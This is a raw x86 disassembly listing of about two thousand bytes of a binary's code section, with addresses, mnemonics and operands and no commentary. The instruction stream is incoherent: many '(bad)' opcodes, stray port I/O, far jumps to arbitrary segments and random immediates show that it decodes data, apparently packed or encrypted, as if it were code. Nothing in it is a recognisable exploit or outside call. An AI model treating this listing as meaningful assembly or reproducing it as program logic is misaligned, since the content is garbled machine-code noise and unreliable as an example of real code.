  4040c0:	jbe    0x40410d
  4040c2:	mov    ds:0x1c153007,eax
  4040c7:	das    
  4040c8:	icebp  
  4040c9:	ret    
  4040ca:	sub    BYTE PTR [edi],bh
  4040cc:	fiadd  WORD PTR [edi]
  4040ce:	dec    esi
  4040cf:	call   0x7a7f5d4c
  4040d4:	push   ss
  4040d5:	pushf  
  4040d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d7:	das    
  4040d8:	mov    esi,0x47b563ac
  4040dd:	push   esi
  4040de:	dec    ebx
  4040df:	adc    DWORD PTR [eax],ecx
  4040e1:	and    DWORD PTR [ecx],ecx
  4040e3:	call   0xb94d50bd
  4040e8:	jae    0x404155
  4040ea:	inc    esp
  4040eb:	add    al,0xcd
  4040ed:	push   ecx
  4040ee:	out    dx,eax
  4040ef:	xchg   ecx,eax
  4040f0:	sbb    ch,BYTE PTR [esi+esi*8+0x3fe2dbb4]
  4040f7:	push   ebp
  4040f8:	daa    
  4040f9:	xchg   esp,eax
  4040fa:	sub    eax,0xc357ddad
  4040ff:	push   ebx
  404100:	or     ah,BYTE PTR [edi]
  404102:	sbb    eax,0x92be3201
  404107:	jg     0x4040b1
  404109:	fwait
  40410a:	ret    
  40410b:	inc    ecx
  40410c:	jae    0x4040d0
  40410e:	das    
  40410f:	jecxz  0x404106
  404111:	jecxz  0x404148
  404113:	jg     0x404156
  404115:	cld    
  404116:	test   esi,esi
  404118:	xchg   ebx,eax
  404119:	dec    ebp
  40411a:	lea    edx,[eax+ecx*1]
  40411d:	dec    edx
  40411e:	ficomp DWORD PTR [ebx+0x568711f]
  404124:	or     eax,0x99203980
  404129:	in     al,dx
  40412a:	pusha  
  40412b:	and    al,0x6a
  40412d:	cmc    
  40412e:	bound  ecx,QWORD PTR [ecx+0x7bb196e1]
  404134:	popa   
  404135:	(bad)  
  404136:	mov    ds:0xd4f69639,al
  40413b:	inc    eax
  40413c:	gs push edi
  40413e:	mov    DWORD PTR [eax+eiz*8+0x5f9f7632],ebp
  404145:	mov    esp,0x952a587d
  40414a:	out    0x2e,al
  40414c:	repz jl 0x4040d6
  40414f:	sub    eax,0x6ce927ae
  404154:	xchg   edi,eax
  404155:	or     DWORD PTR [ecx+0x11896b22],edx
  40415b:	out    dx,al
  40415c:	push   ebp
  40415d:	aam    0x9
  40415f:	push   cs
  404160:	xor    edi,DWORD PTR [ebp+0x50779832]
  404166:	repnz les esp,FWORD PTR [ecx]
  404169:	push   cs
  40416a:	idiv   eax
  40416c:	imul   ecx,DWORD PTR [ecx+0x46b355de],0xeec81899
  404176:	jae    0x404137
  404178:	es retf 0xe392
  40417c:	mov    al,BYTE PTR [ebx-0x41e24522]
  404182:	sub    BYTE PTR [ecx],bh
  404184:	push   ss
  404185:	push   es
  404186:	(bad)
  404189:	loope  0x4041f9
  40418b:	out    0x93,eax
  40418d:	or     al,0x31
  40418f:	je     0x40420f
  404191:	mov    edi,0x9a475941
  404196:	pusha  
  404197:	xchg   edi,eax
  404198:	arpl   WORD PTR [eax],bp
  40419a:	dec    esp
  40419b:	and    ecx,edx
  40419d:	lock jle 0x4041ee
  4041a0:	mov    DWORD PTR [ecx],edx
  4041a2:	mov    cl,0x8e
  4041a4:	in     eax,dx
  4041a5:	fld    TBYTE PTR [ebx+ecx*1-0x7b]
  4041a9:	fisubr DWORD PTR [edx+eax*8]
  4041ac:	or     BYTE PTR [ebx-0x80],cl
  4041af:	jmp    0x53ed:0x95cc4248
  4041b6:	in     eax,0x2c
  4041b8:	and    eax,0x1174c1ad
  4041bd:	add    eax,DWORD PTR [edx+0x1]
  4041c0:	nop
  4041c1:	test   eax,0x9f18e5b5
  4041c6:	(bad)  
  4041c7:	nop
  4041c8:	mov    cl,0xdb
  4041ca:	cwde   
  4041cb:	dec    ecx
  4041cc:	icebp  
  4041cd:	dec    ebp
  4041ce:	leave  
  4041cf:	mov    ecx,0x250a11ba
  4041d4:	push   cs
  4041d5:	xchg   ebp,eax
  4041d6:	mov    bx,0x73a6
  4041da:	push   cs
  4041db:	pop    edx
  4041dc:	dec    ebx
  4041dd:	lods   eax,DWORD PTR ds:[esi]
  4041de:	xchg   esi,eax
  4041df:	xor    eax,DWORD PTR [esi+0x2d]
  4041e2:	and    DWORD PTR [edx-0x1b],ecx
  4041e5:	mov    BYTE PTR [ebx+0x7e],ch
  4041e8:	cld    
  4041e9:	pop    ss
  4041ea:	dec    esi
  4041eb:	pop    ebx
  4041ec:	rol    esi,0xbb
  4041ef:	jae    0x4041bd
  4041f1:	scas   al,BYTE PTR es:[edi]
  4041f2:	das    
  4041f3:	enter  0x1c0b,0xe7
  4041f7:	jb     0x4041b7
  4041f9:	cli    
  4041fa:	imul   bh
  4041fc:	mov    ah,0xa2
  4041fe:	or     bh,BYTE PTR [edi]
  404200:	jmp    0x404233
  404202:	fsubp  st(5),st
  404204:	je     0x4041d2
  404206:	ins    DWORD PTR es:[edi],dx
  404207:	cmp    al,0xdc
  404209:	jb     0x40425e
  40420b:	hlt    
  40420c:	cmp    DWORD PTR [ebp-0x71e7dd34],ebx
  404212:	cmc    
  404213:	inc    edi
  404214:	cmp    DWORD PTR [ebp+0xd],eax
  404217:	out    dx,al
  404218:	or     DWORD PTR [esp+edx*4-0x31ac68ec],0x69
  404220:	xchg   esp,eax
  404221:	xchg   BYTE PTR [eax+0x1f6daa5f],bl
  404227:	mov    ds:0x5c92a8f5,al
  40422c:	pop    ds
  40422d:	outs   dx,BYTE PTR ds:[esi]
  40422e:	mov    ch,0xfb
  404230:	mov    ds:0x2ab05fd,al
  404235:	fst    DWORD PTR [ebx+0x28e35337]
  40423b:	mov    ah,0xb8
  40423d:	adc    DWORD PTR [edx+0x2f],edx
  404240:	mov    ah,0x95
  404242:	mov    al,0xd3
  404244:	sbb    ebp,ecx
  404246:	div    BYTE PTR [esi+0x5d327932]
  40424c:	sbb    eax,0xd776438c
  404251:	add    DWORD PTR [edx-0x50],edx
  404254:	std    
  404255:	cli    
  404256:	inc    esi
  404257:	clc    
  404258:	aas    
  404259:	ficom  WORD PTR gs:[edi+0x75]
  40425d:	das    
  40425e:	(bad)  
  40425f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404260:	jae    0x404251
  404262:	mov    ebp,0x90a61837
  404267:	in     al,dx
  404268:	inc    edi
  404269:	cmp    BYTE PTR [esi-0x5b],bl
  40426c:	bound  eax,QWORD PTR [edx]
  40426e:	mov    ch,0xc9
  404270:	add    al,0xc1
  404272:	dec    esp
  404273:	push   esi
  404274:	inc    ecx
  404275:	aam    0x56
  404277:	and    eax,0xffffff9d
  40427a:	jns    0x4042c7
  40427c:	cs sub al,0x5a
  40427f:	in     eax,0x25
  404281:	or     DWORD PTR [esi],esp
  404283:	xor    al,BYTE PTR [ecx+0x57]
  404286:	cmc    
  404287:	push   ss
  404288:	in     al,0x7a
  40428a:	inc    ecx
  40428b:	or     eax,0xdc6e99ee
  404290:	sbb    ebx,ecx
  404292:	les    esp,FWORD PTR [ecx]
  404294:	dec    esp
  404295:	mov    DWORD PTR [edx],eax
  404297:	xor    bl,BYTE PTR [edx-0x4b]
  40429a:	cli    
  40429b:	sub    bh,BYTE PTR [ecx+esi*1+0x3ca5449a]
  4042a2:	adc    BYTE PTR [edx],dl
  4042a4:	dec    ebp
  4042a5:	sub    DWORD PTR [eax+0x79b399fa],edi
  4042ab:	inc    ebx
  4042ac:	in     al,0x84
  4042ae:	and    ebp,ecx
  4042b0:	sub    BYTE PTR [eax+0x7a7c9cd1],al
  4042b6:	sti    
  4042b7:	mov    bh,0x80
  4042b9:	ss mov bh,0xfe
  4042bc:	push   ebp
  4042bd:	add    eax,0x2497dedd
  4042c2:	daa    
  4042c3:	pop    ebp
  4042c4:	pop    ecx
  4042c5:	or     al,BYTE PTR [eax]
  4042c7:	cmp    al,0xdc
  4042c9:	sbb    al,0xa6
  4042cb:	mov    WORD PTR gs:[eax],ds
  4042ce:	mov    ch,0x8
  4042d0:	enter  0xcd69,0x9c
  4042d4:	xor    esp,DWORD PTR [ecx+0x68c4640b]
  4042da:	xor    eax,0xde041003
  4042df:	bnd jno 0x4042a2
  4042e2:	imul   edi,DWORD PTR [edx-0x34],0xf34cbf19
  4042e9:	pop    esp
  4042ea:	fs mov ah,0x7f
  4042ed:	stos   BYTE PTR es:[edi],al
  4042ee:	cmp    eax,0x4df313d
  4042f3:	mov    esp,0xae2ca444
  4042f9:	shl    BYTE PTR ds:0x3014bcb8,1
  4042ff:	and    eax,0xd1bb4916
  404304:	add    edx,ebp
  404306:	repz xchg ebx,eax
  404308:	jno    0x404382
  40430a:	fistp  DWORD PTR [edi+0x1230d4f9]
  404310:	sbb    DWORD PTR [edx+0x615d4100],esp
  404316:	cmp    DWORD PTR ds:0xe09fe284,edi
  40431c:	rol    cl,cl
  40431e:	jae    0x404347
  404320:	cmp    al,0x67
  404322:	jl     0x4042a9
  404324:	add    al,BYTE PTR [eax+0x78bf8183]
  40432a:	jg     0x404366
  40432c:	jge    0x404345
  40432e:	push   ss
  40432f:	pop    esp
  404330:	test   BYTE PTR [edi+0x7f9e340],dl
  404336:	pop    ds
  404337:	mov    dl,0x25
  404339:	add    al,0x13
  40433b:	inc    eax
  40433c:	add    bl,bl
  40433e:	or     al,0x7e
  404340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404341:	int3   
  404342:	rcl    BYTE PTR [ebx-0x6136a579],0x97
  404349:	ret    
  40434a:	(bad)  
  40434b:	push   eax
  40434c:	lods   al,BYTE PTR ds:[esi]
  40434d:	(bad)  
  40434e:	div    DWORD PTR [eax-0x7d]
  404351:	jae    0x4043c9
  404353:	not    DWORD PTR ds:0xd9888463
  404359:	pop    edx
  40435a:	cmp    al,0x28
  40435c:	aas    
  40435d:	scas   eax,DWORD PTR es:[edi]
  40435e:	fs rcl ebp,cl
  404361:	xchg   edi,eax
  404362:	mov    ebx,0xf1dbae8a
  404367:	daa    
  404368:	loopne 0x404305
  40436a:	jb     0x404364
  40436c:	sub    eax,0xf360f8f4
  404371:	es ret 
  404373:	loope  0x404398
  404375:	mov    esp,0xc6f41321
  40437a:	add    ebx,DWORD PTR [ebp-0x7d4df452]
  404380:	pop    edx
  404381:	fistp  DWORD PTR [edi+eiz*1+0x3f]
  404385:	es cld 
  404387:	jle    0x404316
  404389:	aaa    
  40438a:	push   ebp
  40438b:	cmp    BYTE PTR [esi-0x1d098b55],ch
  404391:	pop    es
  404392:	add    ebp,DWORD PTR [ebx+0x30]
  404395:	xchg   DWORD PTR [ecx-0x64f7a939],eax
  40439b:	jp     0x404379
  40439d:	push   ebx
  40439e:	dec    edx
  40439f:	cs push esi
  4043a1:	dec    edi
  4043a2:	cdq    
  4043a3:	lea    eax,[esp+ebp*2]
  4043a6:	out    dx,al
  4043a7:	out    dx,al
  4043a8:	mov    eax,0xdc528188
  4043ae:	inc    ebx
  4043af:	fcomi  st,st(7)
  4043b1:	fcmovbe st,st(2)
  4043b3:	jb     0x4043a5
  4043b5:	and    BYTE PTR [edi+0x63a4839f],al
  4043bb:	adc    al,BYTE PTR [esi-0x7d]
  4043be:	xchg   ecx,eax
  4043bf:	push   ss
  4043c0:	loop   0x404376
  4043c2:	xor    DWORD PTR [eax],ebx
  4043c4:	adc    BYTE PTR [esi+edi*2],cl
  4043c7:	aas    
  4043c8:	(bad)  
  4043c9:	mov    ds:0xa6617e72,eax
  4043ce:	adc    al,0x51
  4043d0:	fsubr  QWORD PTR [edi-0x58d448f]
  4043d6:	mov    eax,ecx
  4043d8:	cmp    BYTE PTR [edi],ch
  4043da:	inc    DWORD PTR [ecx]
  4043dc:	and    eax,DWORD PTR ds:0x86beed9f
  4043e2:	push   esi
  4043e3:	das    
  4043e4:	inc    ebp
  4043e5:	add    ecx,DWORD PTR [edi]
  4043e7:	enter  0x446,0xa6
  4043eb:	jp     0x404466
  4043ed:	scas   al,BYTE PTR es:[edi]
  4043ee:	pop    es
  4043ef:	xchg   dl,dl
  4043f1:	cdq    
  4043f2:	js     0x404456
  4043f4:	mov    ss,WORD PTR [ecx+ecx*8+0x151dd1ac]
  4043fb:	mov    ebx,DWORD PTR [eax]
  4043fd:	in     eax,0x3a
  4043ff:	dec    ecx
  404400:	arpl   si,bx
  404402:	xor    eax,0x24d15491
  404407:	adc    BYTE PTR [ebp+0x41],ah
  40440a:	inc    ebx
  40440b:	lock inc esi
  40440d:	inc    esp
  40440e:	clc    
  40440f:	mov    al,ds:0x61af64a
  404414:	mov    fs,WORD PTR [ebp+0x1e35707]
  40441a:	cmp    al,0xd5
  40441c:	test   al,0x60
  40441e:	add    BYTE PTR [edx],0x7c
  404421:	iret   
  404422:	xchg   ecx,eax
  404423:	mov    ds:0x836fb1b9,eax
  404428:	(bad)  
  404429:	in     al,0x8a
  40442b:	shl    DWORD PTR [eax+0x61a3ddd5],0xd4
  404432:	loop   0x40441d
  404434:	inc    ebx
  404435:	inc    ebx
  404436:	mov    esi,0x864282c1
  40443b:	fwait
  40443c:	xor    edx,DWORD PTR [ebx+0x79dc332b]
  404442:	js     0x4043db
  404444:	sbb    eax,0xd0351433
  404449:	leave  
  40444a:	stos   DWORD PTR es:[edi],eax
  40444b:	ror    DWORD PTR [ecx+ebp*8-0x1],cl
  40444f:	leave  
  404450:	xor    bl,BYTE PTR [edx+0x2d324b5e]
  404456:	repnz loopne 0x4044c9
  404459:	jbe    0x404418
  40445b:	sti    
  40445c:	push   ebx
  40445d:	aad    0x3c
  40445f:	arpl   WORD PTR ds:0xea70dee0,si
  404465:	jbe    0x404403
  404467:	jns    0x4044c7
  404469:	pop    ebx
  40446a:	xor    al,0x54
  40446c:	and    ebx,DWORD PTR [esi+0x27fc1351]
  404472:	popa   
  404473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404474:	add    eax,0x2e04680a
  404479:	jnp    0x4044a2
  40447b:	push   edi
  40447c:	mov    dl,0xf9
  40447e:	push   cs
  40447f:	jg     0x404468
  404481:	test   al,0x1d
  404483:	mov    edi,0x1a868218
  404488:	sbb    bh,al
  40448a:	mov    esi,0x39862b2b
  40448f:	pushf  
  404490:	adc    al,0xc8
  404492:	imul   edx,DWORD PTR [ebp+0x5adf6a67],0xf92e6687
  40449c:	mov    eax,DWORD PTR [esi+0x6ce7b33e]
  4044a2:	ja     0x40443a
  4044a4:	je     0x4044ef
  4044a6:	inc    ebx
  4044a7:	aaa    
  4044a8:	loop   0x404454
  4044aa:	fidiv  DWORD PTR [ebx+0x72]
  4044ad:	jne    0x404466
  4044af:	pop    ds
  4044b0:	enter  0x325,0xf7
  4044b4:	jge    0x40450a
  4044b6:	push   esp
  4044b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b8:	mov    esi,0x5e2e6a8e
  4044bd:	imul   ebp,DWORD PTR [edx+0x2],0x960da256
  4044c4:	sub    DWORD PTR [esi+0x36926e6f],ebp
  4044ca:	adc    al,BYTE PTR [ebx+0x1e]
  4044cd:	stos   DWORD PTR es:[edi],eax
  4044ce:	mov    edi,0x48306abc
  4044d3:	shl    DWORD PTR [eax*8-0x6880bf98],1
  4044da:	mov    ebx,0xd6ca559b
  4044df:	ret    
  4044e0:	push   ecx
  4044e1:	fwait
  4044e2:	nop
  4044e3:	push   es
  4044e4:	xor    eax,0xed545c1d
  4044e9:	xchg   edi,eax
  4044ea:	cwde   
  4044eb:	and    ah,bl
  4044ed:	vpcmpeqw xmm6,xmm0,XMMWORD PTR [ebx]
  4044f1:	out    dx,eax
  4044f2:	xor    DWORD PTR [edi+edx*4-0xef36e81],ebx
  4044f9:	mov    ebp,0x6049561e
  4044fe:	test   dh,ch
  404500:	out    dx,al
  404501:	retf   0x6e95
  404504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404505:	fucomi st,st(0)
  404507:	lods   al,BYTE PTR ds:[esi]
  404508:	cmp    cl,dl
  40450a:	data16 std 
  40450c:	sub    al,0xe3
  40450e:	rcr    BYTE PTR [edi],0xea
  404511:	xchg   ebp,eax
  404512:	and    al,0xb2
  404514:	mov    ecx,DWORD PTR es:[eax-0x6fa8ff6d]
  40451b:	lock mov al,BYTE PTR [edi-0x1994c755]
  404522:	mov    ebx,DWORD PTR [edi+0x55]
  404525:	jge    0x4044e5
  404527:	aas    
  404528:	pushf  
  404529:	mov    bh,0xbe
  40452b:	xor    BYTE PTR [edi],cl
  40452d:	aam    0x16
  40452f:	pop    ebx
  404530:	push   edx
  404531:	add    edi,edi
  404533:	pop    ds
  404534:	push   edi
  404535:	imul   esi,DWORD PTR [edi-0x17],0xffffff90
  404539:	and    dh,BYTE PTR [edi+0x146dd8bc]
  40453f:	mov    esi,0x50be4ec4
  404544:	fild   QWORD PTR [edi-0x35]
  404547:	inc    edx
  404548:	jnp    0x40451b
  40454a:	scas   al,BYTE PTR es:[edi]
  40454b:	adc    eax,0x497aad2f
  404550:	sar    DWORD PTR [ecx+0x183b0760],cl
  404556:	outs   dx,DWORD PTR ds:[esi]
  404557:	(bad)  
  404559:	mov    bh,0x5c
  40455b:	not    dl
  40455d:	std    
  40455e:	mov    esp,0x5127b21b
  404563:	and    al,0x37
  404565:	aas    
  404566:	xchg   edi,eax
  404567:	pop    ebx
  404568:	je     0x4045ce
  40456a:	or     BYTE PTR [edi-0x48922a12],0xc6
  404571:	pop    esp
  404572:	jno    0x4045d8
  404574:	sub    BYTE PTR [edi-0x75ddcf5a],ch
  40457a:	adc    al,0x75
  40457c:	arpl   WORD PTR [edx+0x22901633],bp
  404582:	cmovnp ebp,DWORD PTR [edi]
  404585:	test   DWORD PTR [edi-0x4b],0xdaa33914
  40458c:	jmp    0xb67f:0xd5f1327f
  404593:	inc    edx
  404594:	xor    esp,DWORD PTR [edx]
  404596:	stos   BYTE PTR es:[edi],al
  404597:	scas   eax,DWORD PTR es:[edi]
  404598:	inc    ebx
  404599:	stc    
  40459a:	test   al,0x4c
  40459c:	jae    0x404566
  40459e:	loop   0x404540
  4045a0:	sbb    cl,ah
  4045a2:	jno    0x40455c
  4045a4:	and    edx,DWORD PTR [ecx]
  4045a6:	xor    BYTE PTR [edi+0xc454361],0x3a
  4045ad:	jbe    0x40456d
  4045af:	mov    BYTE PTR [ecx],dl
  4045b1:	not    dh
  4045b3:	imul   ecx,DWORD PTR [esi-0x587d1a1f],0x4ea146a2
  4045bd:	dec    edi
  4045be:	das    
  4045bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c0:	cmp    eax,0x13aff438
  4045c5:	xchg   ebx,eax
  4045c6:	mov    cl,0xb9
  4045c8:	es ss pop eax
  4045cb:	mov    ?,WORD PTR [ecx+0x40]
  4045ce:	jno    0x404594
  4045d0:	scas   al,BYTE PTR es:[edi]
  4045d1:	xchg   BYTE PTR [eax],ah
  4045d3:	cmp    edi,DWORD PTR es:0xc15f4e08
  4045da:	adc    ebp,edx
  4045dc:	xchg   ebp,eax
  4045dd:	push   ebx
  4045de:	xor    ebp,DWORD PTR [ecx]
  4045e0:	add    DWORD PTR [eax+ecx*4-0x7b],0xffffffb8
  4045e5:	(bad)  
  4045e7:	adc    BYTE PTR ds:0xddf6c974,bl
  4045ed:	shl    BYTE PTR [edi],1
  4045ef:	and    al,0x2
  4045f1:	sub    al,0x65
  4045f3:	int    0xab
  4045f5:	xchg   ebp,eax
  4045f6:	mov    ds:0x9e109dc1,eax
  4045fb:	les    esp,FWORD PTR [edx+0x44]
  4045fe:	and    eax,0x60e4df0a
  404603:	fidivr WORD PTR [ebx-0x6ab555a1]
  404609:	adc    eax,0x923d9d2e
  40460e:	pop    ebx
  40460f:	jge    0x40467b
  404611:	sbb    al,0x4c
  404614:	addr16 (bad) 
  404616:	adc    al,0x19
  404618:	repnz xchg ebp,eax
  40461a:	cld    
  40461b:	jmp    0x4045e3
  40461d:	jmp    0x4045ea
  40461f:	es dec ebx
  404621:	stos   DWORD PTR es:[edi],eax
  404622:	mov    al,0x3d
  404624:	or     bl,ch
  404626:	in     eax,0x8d
  404628:	push   edi
  404629:	push   ss
  40462a:	(bad)  
  40462c:	call   0x9caf:0x4d7ad9af
  404633:	leave  
  404634:	mov    al,ds:0xcfb4f19f
  404639:	xor    BYTE PTR [ecx*4+0x3d7d3329],ah
  404640:	inc    esp
  404641:	sbb    eax,0x5d22c88e
  404646:	cli    
  404647:	xor    DWORD PTR [esi],ebp
  404649:	cmp    edi,DWORD PTR [edi+ecx*2-0xf469556]
  404650:	outs   dx,BYTE PTR ds:[esi]
  404651:	pusha  
  404652:	xor    al,0x90
  404654:	ret    
  404655:	repz adc eax,0x712416e1
  40465b:	dec    edx
  40465c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465d:	jle    0x4046c8
  40465f:	and    BYTE PTR [esi-0x46b9dfda],bh
  404665:	ror    BYTE PTR [esi],0xa4
  404668:	pop    ebx
  404669:	idiv   BYTE PTR ds:0xc34ed57d
  40466f:	pop    edx
  404670:	pop    esp
  404671:	call   0x39e80d67
  404676:	test   eax,0x1c24d5b6
  40467b:	inc    edx
  40467c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467d:	fstp   DWORD PTR [esi+0x42]
  404680:	inc    ebp
  404681:	es dec esi
  404683:	sub    DWORD PTR [esp+eax*4-0x60f25ab1],esp
  40468a:	rcl    esp,0x63
  40468d:	lods   al,BYTE PTR ds:[esi]
  40468e:	jmp    0xdfd03852
  404693:	inc    esp
  404694:	dec    eax
  404695:	retf   
  404696:	fwait
  404697:	imul   esi,DWORD PTR [ebp-0x6d],0xfffffff5
  40469b:	push   0xffffffb4
  40469d:	in     al,dx
  40469e:	add    eax,0xde599a78
  4046a3:	rcl    BYTE PTR [ebx-0x26],cl
  4046a6:	test   eax,0xf19d3888
  4046ab:	add    bh,bh
  4046ad:	inc    eax
  4046ae:	mov    ebp,0x729e0e11
  4046b3:	push   0xe0d98a2a
  4046b8:	cmp    BYTE PTR [ebx+0x27a891bd],dh
  4046be:	loope  0x4046e5
  4046c0:	ret    0x9b09
  4046c3:	dec    ebp
  4046c4:	fistp  DWORD PTR [ebp+0x337d9dbb]
  4046ca:	(bad)  
  4046cb:	adc    DWORD PTR [edi+0x50ebcc7a],esi
  4046d1:	(bad)  
  4046d2:	sub    ch,BYTE PTR [eax]
  4046d4:	call   DWORD PTR [eax-0x6b]
  4046d7:	pop    ecx
  4046d8:	jmp    0xa051:0x40efe4a
  4046df:	sub    DWORD PTR [edx+edx*8+0x11d10588],0xffffffef
  4046e7:	in     eax,dx
  4046e8:	out    0xb,eax
  4046ea:	aad    0xff
  4046ec:	jle    0x404729
  4046ee:	mov    dh,0xb1
  4046f0:	sub    al,0x6b
  4046f2:	xor    DWORD PTR [ecx-0x7],esp
  4046f5:	popf   
  4046f6:	xor    BYTE PTR [eax-0x76],0x50
  4046fa:	repnz div BYTE PTR [ecx-0x6e]
  4046fe:	pop    edx
  4046ff:	push   esp
  404700:	faddp  st(6),st
  404702:	ss mov bh,0x1
  404705:	mov    ebx,0x283bae12
  40470a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40470b:	xchg   esi,eax
  40470c:	inc    eax
  40470d:	lods   al,BYTE PTR ds:[esi]
  40470e:	enter  0x5d15,0xa2
  404712:	nop
  404713:	dec    edx
  404714:	rcl    DWORD PTR [edi],cl
  404716:	gs cli 
  404718:	scas   eax,DWORD PTR es:[edi]
  404719:	retf   0x2107
  40471c:	pop    esi
  40471d:	jg     0x4046df
  40471f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404720:	shl    DWORD PTR [ebx-0x50],1
  404723:	sahf   
  404724:	sub    eax,0xd4890c74
  404729:	xchg   DWORD PTR [ebx+esi*1+0x54],eax
  40472d:	add    ebx,DWORD PTR [esi-0x19f75e10]
  404733:	sar    dl,1
  404735:	unpckhps xmm2,XMMWORD PTR [edi-0x1a]
  404739:	push   ebp
  40473a:	loopne 0x40473a
  40473c:	xor    ebp,DWORD PTR [ebx-0x38830a38]
  404742:	rcl    DWORD PTR [ecx+edx*2],1
  404745:	retf   
  404746:	inc    esi
  404747:	mov    esp,0x5f9ba362
  40474c:	push   edi
  40474d:	(bad)  
  40474f:	rol    BYTE PTR [ecx],0x69
  404752:	fwait
  404753:	fwait
  404754:	cli    
  404755:	imul   eax,DWORD PTR [ecx-0x2987ddd1],0x7a73d500
  40475f:	jnp    0x404717
  404761:	test   al,0x50
  404763:	pop    esp
  404764:	into   
  404765:	iret   
  404766:	pusha  
  404767:	jo     0x40477a
  404769:	loopne 0x40478a
  40476b:	jae    0x4047a4
  40476d:	pop    eax
  40476e:	loop   0x4047a1
  404770:	mov    ebx,0xbbddf2d8
  404775:	inc    ebp
  404776:	mov    edi,0xa6daf720
  40477b:	mov    edi,0xbe0b37d1
  404780:	dec    ebx
  404781:	enter  0x14cc,0xea
  404785:	push   esp
  404786:	les    esi,FWORD PTR [esi]
  404788:	inc    ebx
  404789:	cmp    al,0xd0
  40478b:	nop
  40478c:	pop    edi
  40478d:	pop    ds
  40478e:	mov    al,0xab
  404790:	jmp    0xf9728324
  404795:	mov    dh,0x97
  404797:	fadd   QWORD PTR [ebx+0xf]
  40479a:	xchg   edi,eax
  40479b:	test   eax,0x88db28f7
  4047a0:	add    DWORD PTR [esi+0x18],ecx
  4047a3:	(bad)  
  4047a5:	into   
  4047a6:	cmp    esp,DWORD PTR [edx-0x3e]
  4047a9:	arpl   WORD PTR [ebx-0x48fba143],di
  4047af:	or     DWORD PTR [edx],esp
  4047b1:	iret   
  4047b2:	xchg   ecx,eax
  4047b3:	scas   ax,WORD PTR es:[edi]
  4047b5:	sub    eax,0xedf65752
  4047ba:	xchg   edi,eax
  4047bb:	fnstsw WORD PTR [edx+0x79]
  4047be:	mov    ?,WORD PTR [ecx+0x4fc1d499]
  4047c4:	popf   
  4047c5:	push   esi
  4047c6:	xchg   ebp,eax
  4047c7:	and    ebp,ebp
  4047c9:	mov    ch,0x9a
  4047cb:	scas   eax,DWORD PTR es:[edi]
  4047cc:	mov    edi,0x48cf8f34
  4047d1:	cmp    al,cl
  4047d3:	mov    esp,0xdf66dcc8
  4047d8:	mov    esi,0xaf024a5
  4047dd:	(bad)  
  4047df:	mov    bh,0xa4
  4047e1:	ss cmp al,0x67
  4047e4:	push   esi
  4047e5:	ret    
  4047e6:	xchg   edx,eax
  4047e7:	int    0x52
  4047e9:	mov    edi,0xd3f6e237
  4047ee:	xor    dh,ah
  4047f0:	fld    st(1)
  4047f2:	jns    0x404826
  4047f4:	xor    DWORD PTR [ebp+0x32b5fa2a],ebp
  4047fa:	(bad)  
  4047fb:	es pop ss
  4047fd:	enter  0xcadd,0x99
  404801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404802:	mov    esi,0x63482566
  404807:	int    0x43
  404809:	cmp    eax,0x8dc2d60
  40480e:	dec    ebp
  40480f:	loope  0x404843
  404811:	inc    eax
  404812:	lea    esi,[esi]
  404814:	and    eax,0x8eb0abd0
  404819:	int3   
  40481a:	lds    eax,FWORD PTR [edx]
  40481c:	ficomp WORD PTR [edi+0x1b46bdf0]
  404822:	enter  0xed1a,0x8a
  404826:	(bad)  
  404827:	inc    ebp
  404828:	push   cs
  404829:	mov    eax,ds:0x2d3c9395
  40482e:	arpl   WORD PTR [eax-0x3483481e],ax
  404834:	inc    edx
  404835:	dec    esp
  404836:	mov    ch,0x33
  404838:	stos   BYTE PTR es:[edi],al
  404839:	and    cl,bl
  40483b:	or     esp,ecx
  40483d:	jmp    0xf00a9eaa
  404842:	dec    ebp
  404843:	add    BYTE PTR [esi+0x7],0x6f
  404847:	aam    0x35
  404849:	in     eax,0x4e
  40484b:	rcl    BYTE PTR cs:[eax+0x435a69db],1
  404852:	jmp    0x4047ea
  404854:	xlat   BYTE PTR ds:[ebx]
  404855:	not    BYTE PTR [edi+0x7e34d563]
  40485b:	stos   DWORD PTR es:[edi],eax
  40485c:	inc    edi
  40485d:	mov    ch,BYTE PTR [ebx]
  40485f:	mov    ds:0xac847f86,eax
  404864:	adc    al,0x9f
  404866:	ja     0x4048ce
  404868:	mov    ch,0xaf
  40486a:	(bad)  
  40486b:	jle    0x404881
  40486d:	int3   
  40486e:	mov    DWORD PTR [edx+0xb],esi
  404871:	(bad)  
  404872:	int3   
  404873:	pop    ds
  404874:	jne    0x404805
  404876:	(bad)  
  404877:	call   0x9ead1f5d
  40487c:	push   es
  40487d:	jle    0x40487a
  40487f:	stos   BYTE PTR es:[edi],al
  404880:	sbb    DWORD PTR [eax],esp
  404882:	mov    bh,0x1e
  404884:	pop    ds
  404885:	daa    
  404886:	lods   eax,DWORD PTR ds:[esi]
  404887:	push   es
  404888:	int    0xd9
  40488a:	sub    cl,BYTE PTR [edi+0x330f7e13]
  404890:	(bad)  
  404892:	pop    ds
  404893:	dec    edx
  404894:	and    DWORD PTR [esi-0x55f0d1a6],edx
  40489a:	jns    0x404882
  40489c:	cs push cs
  40489e:	int3   
  40489f:	daa    
  4048a0:	jmp    0x87ff:0x822529b6
  4048a7:	test   eax,0x8e8aadd3
  4048ac:	xchg   edx,eax
  4048ad:	in     al,dx
  4048ae:	jne    0x4048b2
  4048b0:	sub    edx,esi
  4048b2:	fadd   DWORD PTR [edx]
  4048b4:	xor    dl,BYTE PTR [edx]
  4048b6:	cmp    esp,DWORD PTR [ecx+eiz*2]
  4048b9:	jl     0x4048c0
  4048bb:	mov    ah,0xdb
  4048bd:	inc    esi
  4048be:	sbb    edx,DWORD PTR [ebx+edi*8-0x6017ec2]
  4048c5:	(bad)  
  4048c6:	cmc    
  4048c7:	push   ebp
  4048c8:	(bad)  
  4048c9:	xor    BYTE PTR [ecx-0x16],dl
